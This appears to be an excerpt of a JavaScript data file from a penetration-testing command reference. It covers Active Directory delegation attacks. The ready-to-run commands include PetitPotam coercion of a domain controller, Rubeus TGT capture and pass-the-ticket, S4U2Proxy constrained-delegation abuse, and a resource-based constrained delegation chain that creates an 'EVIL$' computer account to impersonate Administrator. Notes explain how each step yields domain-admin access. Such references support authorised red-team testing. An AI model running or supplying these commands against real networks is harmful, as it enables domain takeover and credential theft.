...
const VARIABLES = {
  ...
  '$$CHILD_DOMAIN': {
    name: '$$CHILD_DOMAIN',
    description: 'Child domain FQDN for cross-trust attacks (e.g. child.corp.local)',
    howToGet: [
  ...
  /* ── Active Directory (Full Methodology) ─────────────────────────────── */
  {
    ...
    techniques: [
      ...
      },
      {
        ...
        commands: [
          { id: 'adp1', label: 'Find unconstrained delegation hosts', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Computers with unconstrained delegation cache TGTs of every connecting user — extremely high value.' },
          { id: 'adp2', label: 'Find constrained delegation accounts', os: 'Linux', command: 'impacket-findDelegation $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC', notes: 'Lists all delegation configs. Check "Delegation Type" (Constrained/Unconstrained/RBCD) and target SPN.' },
          { id: 'adp3', label: 'Coerce DC auth (PetitPotam)', os: 'Linux', command: 'python3 PetitPotam.py -u $$USER -p $$PASSWORD $$LHOST $$DC', notes: 'Force the DC to authenticate to your controlled host. Run while Rubeus monitors on the unconstrained host.' },
          { id: 'adp4', label: 'Capture TGT on unconstrained host', os: 'Windows', command: 'Rubeus.exe monitor /interval:2 /nowrap', notes: 'Run on the unconstrained delegation host while coercing the DC — captures the incoming DA TGT.' },
          { id: 'adp5', label: 'Inject captured TGT', os: 'Windows', command: 'Rubeus.exe ptt /ticket:<base64>', notes: 'Pass-the-ticket with the captured DA TGT. Then use standard lateral movement tools as DA.' },
          { id: 'adp6', label: 'Constrained delegation abuse (S4U2Proxy)', os: 'Linux', command: 'impacket-getST -spn cifs/$$DC.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/$$USER:$$PASSWORD', notes: 'S4U2Self + S4U2Proxy to get a service ticket as Administrator for the allowed SPN. No password needed for target.' },
          { id: 'adp7', label: 'RBCD step 1 — create attacker computer', os: 'Linux', command: 'impacket-addcomputer $$DOMAIN/$$USER:$$PASSWORD -computer-name EVIL$ -computer-pass Evil123 -dc-ip $$DC', notes: 'MachineAccountQuota must be > 0 (default 10). Creates a computer account you fully control.' },
          { id: 'adp8', label: 'RBCD step 2 — configure delegation', os: 'Linux', command: 'impacket-rbcd -delegate-from EVIL$ -delegate-to $$TARGET_HOST$ -action write $$DOMAIN/$$USER:$$PASSWORD', notes: 'Requires GenericWrite/GenericAll on the target computer. Writes EVIL$ into its msDS-AllowedToActOnBehalfOfOtherIdentity.' },
          { id: 'adp9', label: 'RBCD step 3 — get ticket as Administrator', os: 'Linux', command: 'impacket-getST -spn cifs/$$TARGET_HOST.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/EVIL$:Evil123', notes: 'S4U2Proxy via RBCD. export KRB5CCNAME=Administrator.ccache then use psexec -k -no-pass.' },
        ],
      },
      {
        id: 'ad-lateral',
